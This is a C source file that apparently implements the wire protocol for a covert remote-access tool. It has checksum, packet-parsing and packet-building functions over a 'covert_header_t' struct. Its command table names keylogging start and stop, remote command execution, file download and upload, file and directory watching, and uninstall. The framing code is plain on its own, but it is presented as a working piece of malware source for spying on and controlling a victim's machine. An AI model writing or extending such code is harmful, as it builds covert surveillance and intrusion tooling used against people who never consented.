#include "protocol.h"

#include <arpa/inet.h>
#include <stdio.h>
#include <string.h>

uint16_t protocol_compute_checksum(const uint8_t *data, size_t len) {
    uint32_t sum = 0;

    for (size_t i = 0; i < len; i++) {
        sum += data[i];
        if (sum >> 16) {
            sum = (sum & 0xFFFFu) + (sum >> 16);
        }
    }

    return (uint16_t)(~sum & 0xFFFFu);
}

int protocol_parse_packet(const uint8_t *packet, size_t packet_len, parsed_packet_t *parsed, char *error, size_t error_len) {
    covert_header_t header;
    uint16_t payload_len;
    uint16_t received_checksum;
    uint16_t computed_checksum;
    size_t expected_len;

    if (packet_len < sizeof(covert_header_t) + CHECKSUM_SIZE) {
        snprintf(error, error_len, "packet too short");
        return -1;
    }

    memcpy(&header, packet, sizeof(header));
    payload_len = ntohs(header.payload_len);

    if (payload_len > PROTOCOL_PACKET_PAYLOAD_MAX) {
        snprintf(error, error_len, "payload too large");
        return -1;
    }

    expected_len = sizeof(covert_header_t) + payload_len + CHECKSUM_SIZE;
    if (packet_len != expected_len) {
        snprintf(error, error_len, "packet length mismatch");
        return -1;
    }

    memcpy(&received_checksum, packet + sizeof(covert_header_t) + payload_len, sizeof(received_checksum));
    received_checksum = ntohs(received_checksum);
    computed_checksum = protocol_compute_checksum(packet, sizeof(covert_header_t) + payload_len);

    if (received_checksum != computed_checksum) {
        snprintf(error, error_len, "checksum mismatch");
        return -1;
    }

    parsed->seq_num = ntohl(header.seq_num);
    parsed->command = header.command;
    parsed->payload_len = payload_len;
    parsed->payload = packet + sizeof(covert_header_t);

    return 0;
}

size_t protocol_build_packet(
    uint32_t seq_num,
    uint8_t command,
    const uint8_t *payload,
    uint16_t payload_len,
    uint8_t *packet,
    size_t packet_size,
    char *error,
    size_t error_len
) {
    covert_header_t header;
    uint16_t checksum;
    size_t packet_len;

    if (payload_len > PROTOCOL_PACKET_PAYLOAD_MAX) {
        snprintf(error, error_len, "payload too large");
        return 0;
    }

    packet_len = sizeof(covert_header_t) + payload_len + CHECKSUM_SIZE;
    if (packet_size < packet_len) {
        snprintf(error, error_len, "packet buffer too small");
        return 0;
    }

    header.seq_num = htonl(seq_num);
    header.command = command;
    header.payload_len = htons(payload_len);

    memcpy(packet, &header, sizeof(header));
    if (payload_len > 0 && payload != NULL) {
        memcpy(packet + sizeof(header), payload, payload_len);
    }

    checksum = htons(protocol_compute_checksum(packet, sizeof(header) + payload_len));
    memcpy(packet + sizeof(header) + payload_len, &checksum, sizeof(checksum));
    return packet_len;
}

const char *protocol_command_name(uint8_t command) {
    switch (command) {
        case CMD_DISCONNECT:
            return "DISCONNECT";
        case CMD_HEARTBEAT:
            return "HEARTBEAT";
        case CMD_KEYLOG_START:
            return "KEYLOG_START";
        case CMD_KEYLOG_STOP:
            return "KEYLOG_STOP";
        case CMD_EXEC_CMD:
            return "EXEC_CMD";
        case CMD_EXEC_OUTPUT:
            return "EXEC_OUTPUT";
        case CMD_FILE_GET:
            return "FILE_GET";
        case CMD_FILE_DATA:
            return "FILE_DATA";
        case CMD_FILE_PUT_BEGIN:
            return "FILE_PUT_BEGIN";
        case CMD_FILE_PUT_CHUNK:
            return "FILE_PUT_CHUNK";
        case CMD_FILE_PUT_END:
            return "FILE_PUT_END";
        case CMD_WATCH_FILE:
            return "WATCH_FILE";
        case CMD_WATCH_DIR:
            return "WATCH_DIR";
        case CMD_UNINSTALL:
            return "UNINSTALL";
        case CMD_OK:
            return "OK";
        case CMD_ERROR:
            return "ERROR";
        case CMD_ACK:
            return "ACK";
        default:
            return "UNKNOWN";
    }
}
